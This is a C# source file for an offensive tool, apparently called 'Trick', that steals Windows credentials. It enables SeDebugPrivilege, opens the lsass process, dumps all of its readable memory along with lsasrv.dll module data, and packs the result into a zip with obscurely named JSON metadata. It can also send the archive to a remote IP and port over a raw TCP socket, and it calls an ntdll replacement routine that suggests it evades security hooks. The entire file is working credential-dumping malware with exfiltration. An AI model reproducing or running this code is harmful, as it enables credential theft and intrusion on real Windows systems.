using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.IO.Compression;
using System.Runtime.InteropServices;
using static Trick.NT;
using System.Net.Sockets;
using System.Net;


namespace Trick
{
    internal class Program
    {
        [DllImport("ntdll.dll")] public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);
        [DllImport("ntdll.dll", SetLastError = true)] private static extern int LdrLoadDll(IntPtr PathToFile, IntPtr Flags, ref UNICODE_STRING ModuleFileName, out IntPtr ModuleHandle);
        [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION { public IntPtr BaseAddress; public IntPtr AllocationBase; public int AllocationProtect; public IntPtr RegionSize; public int State; public int Protect; public int Type; }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] public struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }
        [StructLayout(LayoutKind.Sequential)] public struct CLIENT_ID { public IntPtr UniqueProcess; public IntPtr UniqueThread; }


        public static OSVERSIONINFOEX getBuildNumber()
        {
            OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
            RtlGetVersion(ref osVersionInfo);
            return osVersionInfo;
        }


        public static string ToJson(string[] array)
        {
            string json_str = "{";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += "\"field" + i.ToString() + "\" : \"" + array[i] + "\" , ";
            }
            return (json_str.Substring(0, json_str.Length - 3) + "}");
        }


        public static string ToJsonArray(string[] array)
        {
            string json_str = "[";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += array[i] + ", ";
            }
            return (json_str.Substring(0, json_str.Length - 2) + "]");
        }


        static void WriteToFile(string path, string content)
        {
            System.IO.File.WriteAllText(path, content);
            Console.WriteLine("[+] File " + path + " generated.");
        }


        static string Lock()
        {
            OSVERSIONINFOEX osVersionInfo = getBuildNumber();
            string[] aux_array = { osVersionInfo.dwMajorVersion.ToString(), osVersionInfo.dwMinorVersion.ToString(), osVersionInfo.dwBuildNumber.ToString() };
            string aux_array_json = ToJson(aux_array);
            string[] aux_array_1 = { aux_array_json };
            string lock_json_content = ToJsonArray(aux_array_1);
            return lock_json_content;
        }



        static string Shock()
        {
            // Get library address
            string dllPath = @"C:\Windows\System32\lsasrv.dll";
            UNICODE_STRING unicodeString = new UNICODE_STRING
            {
                Length = (ushort)(dllPath.Length * 2),
                MaximumLength = (ushort)((dllPath.Length + 1) * 2),
                Buffer = Marshal.StringToHGlobalUni(dllPath)
            };

            IntPtr lsasrv_addr;
            try
            {
                int result = LdrLoadDll(IntPtr.Zero, IntPtr.Zero, ref unicodeString, out lsasrv_addr);
                if (result != 0)
                {
                    Console.WriteLine("[-] Failed to load DLL. NTSTATUS: " + result.ToString("X"));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(unicodeString.Buffer);
            }

            // Get library size
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = lsasrv_addr;
            long aux_size = 0;

            while ((long)mem_address < proc_max_address_l)
            {
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                uint ntstatus = NtQueryVirtualMemory((IntPtr)(-1), (IntPtr)mem_address, 0, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
                if (mbi.AllocationBase != lsasrv_addr)
                {
                    break;
                }
                aux_size += mbi.RegionSize.ToInt64();
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }
            string[] aux_array = { "lsasrv.dll", "C:\\\\WINDOWS\\\\system32\\\\lsasrv.dll", ("0x" + lsasrv_addr.ToString("X")), aux_size.ToString() };
            string shock_json_content = ToJsonArray(new string[] { ToJson(aux_array) });

            // Create file
            //string file_name = "shock.json";
            //WriteToFile(file_name, shock_json_content);
            // Generate JSON
            return shock_json_content;

        }


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static string getRandomString(int length, Random random)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            for (int i = 0; i < length; i++)
            {
                int index = random.Next(chars.Length);
                stringBuilder.Append(chars[index]);
            }
            return stringBuilder.ToString();
        }


        public static void GenerateZip(string zipFilePath, List<MemFile> memfile_list)
        {
            // Check it exists, delete if it does
            if (File.Exists(zipFilePath)) { File.Delete(zipFilePath); }

            using (FileStream zipFileStream = new FileStream(zipFilePath, FileMode.Create))
            {
                using (ZipArchive archive = new ZipArchive(zipFileStream, ZipArchiveMode.Create, true))
                {
                    foreach (MemFile m in memfile_list)
                    {
                        ZipArchiveEntry entry = archive.CreateEntry(m.filename, CompressionLevel.Fastest);
                        using (Stream entryStream = entry.Open())
                        {
                            entryStream.Write(m.content, 0, m.content.Length);
                        }
                    }
                }
            }
            Console.WriteLine("[+] File " + zipFilePath + " generated.");
        }


        static Tuple<string, List<MemFile>> Barrel()
        {
            // Random seed
            Random random = new Random();

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get PID
            int processPID = Process.GetProcessesByName("lsass")[0].Id;

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }

            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] It was not possible to get a process handle. If you get 0xC0000022 errors probably PEB is unreadable.");
                Environment.Exit(-1);
            }

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            List<MemFile> memfile_list = new List<MemFile> { };
            string[] aux_array_1 = { };
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                NtQueryVirtualMemory(processHandle, aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and committed -> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    string memdump_filename = getRandomString(10, random) + "." + getRandomString(3, random);

                    // Add to JSON file                    
                    string[] aux_array_2 = { memdump_filename, "0x" + aux_address.ToString("X"), mbi.RegionSize.ToString() };
                    aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();

                    // Add to global byte array
                    MemFile memFile = new MemFile(memdump_filename, buffer);
                    memfile_list.Add(memFile);
                }
                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }
            // Close process handle
            NtClose(processHandle);

            string barrel_json_content = ToJsonArray(aux_array_1);
            return Tuple.Create(barrel_json_content, memfile_list);
        }


        static void AddStringToZip(System.IO.Compression.ZipArchive archive, string entryName, string content)
        {
            ZipArchiveEntry entry = archive.CreateEntry(entryName);
            using (StreamWriter writer = new StreamWriter(entry.Open()))
            {
                writer.Write(content);
            }
        }


        public static void SendBytes(string ipAddress, string portNumber, MemoryStream memoryStream)
        {
            IPAddress serverAddress = IPAddress.Parse(ipAddress);
            int serverPort = Int32.Parse(portNumber);
            using (Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
            {
                clientSocket.Connect(new IPEndPoint(serverAddress, serverPort));
                memoryStream.Seek(0, SeekOrigin.Begin);
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = memoryStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    clientSocket.Send(buffer, 0, bytesRead, SocketFlags.None);
                }
                clientSocket.Shutdown(SocketShutdown.Both);
            }
        }


        public static void GenerateTrickZip(string zipFilePath, string lock_str, string shock_str, string barrel_str, List<MemFile> barrel_memfiles, string ip_addr, string port)
        {
            // Generate ZIP file
            if (ip_addr == "" || port == "")
            {
                // Check it exists, delete if it does
                if (File.Exists(zipFilePath)) { File.Delete(zipFilePath); }

                using (FileStream zipStream = new FileStream(zipFilePath, FileMode.Create))
                {
                    using (ZipArchive archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
                    {
                        AddStringToZip(archive, "lock.json", lock_str);
                        AddStringToZip(archive, "shock.json", shock_str);
                        AddStringToZip(archive, "barrel.json", barrel_str);
                        ZipArchiveEntry innerZipEntry = archive.CreateEntry("barrel.zip");
                        using (Stream innerZipStream = innerZipEntry.Open())
                        {
                            using (System.IO.Compression.ZipArchive innerArchive = new System.IO.Compression.ZipArchive(innerZipStream, ZipArchiveMode.Create))
                            {
                                foreach (MemFile m in barrel_memfiles)
                                {
                                    ZipArchiveEntry entry = innerArchive.CreateEntry(m.filename, CompressionLevel.Fastest);
                                    using (Stream entryStream = entry.Open())
                                    {
                                        entryStream.Write(m.content, 0, m.content.Length);
                                    }
                                }
                            }
                        }
                    }
                }
                Console.WriteLine("[+] File " + zipFilePath + " generated.");
            }

            // Send ZIP file to remote port
            else
            {
                using (MemoryStream zipStream = new MemoryStream())
                {
                    using (System.IO.Compression.ZipArchive archive = new System.IO.Compression.ZipArchive(zipStream, ZipArchiveMode.Create, true))
                    {
                        AddStringToZip(archive, "lock.json", lock_str);
                        AddStringToZip(archive, "shock.json", shock_str);
                        AddStringToZip(archive, "barrel.json", barrel_str);
                        ZipArchiveEntry innerZipEntry = archive.CreateEntry("barrel.zip");
                        using (Stream innerZipStream = innerZipEntry.Open())
                        {
                            using (System.IO.Compression.ZipArchive innerArchive = new System.IO.Compression.ZipArchive(innerZipStream, ZipArchiveMode.Create))
                            {
                                foreach (MemFile m in barrel_memfiles)
                                {
                                    ZipArchiveEntry entry = innerArchive.CreateEntry(m.filename, CompressionLevel.Fastest);
                                    using (Stream entryStream = entry.Open())
                                    {
                                        entryStream.Write(m.content, 0, m.content.Length);
                                    }
                                }
                            }
                        }
                        zipStream.Seek(0, SeekOrigin.Begin);
                        SendBytes(ip_addr, port, zipStream);
                        Console.WriteLine("[+] File sent successfully.");
                    }
                }
            }
        }


        static void Main(string[] args)
        {
            // Check binary is correctly compiled
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] File must be compiled as 64-byte binary.");
                Environment.Exit(-1);
            }

            // Replace ntdll library
            string ntdll_option = "default";
            string ip_addr = "";
            string port = "";
            if (args.Length >= 1)
            {
                ntdll_option = args[0];
            }
            if (args.Length >= 2)
            {
                ip_addr = args[1];
            }
            if (args.Length >= 3)
            {
                port = args[2];
            }
            ReplaceLibrary(ntdll_option, "");


            // 1 - Get OS information. Returns: JSON string
            string lock_str = Lock();

            // 2 - Get modules (ModuleList) information. Returns: JSON string + Process Handle
            string shock_str = Shock();
           
            // 3 - Get Mem64List information + Dump memory regions. Arguments: Lsass process handle. Returns: JSON string and List of MemFile
            var barrel_result = Barrel();
            string barrel_str = barrel_result.Item1;
            List<MemFile> barrel_mem = barrel_result.Item2;

            // Generate the final trick.zip
            GenerateTrickZip("trick.zip", lock_str, shock_str, barrel_str, barrel_mem, ip_addr, port);
        }
    }
}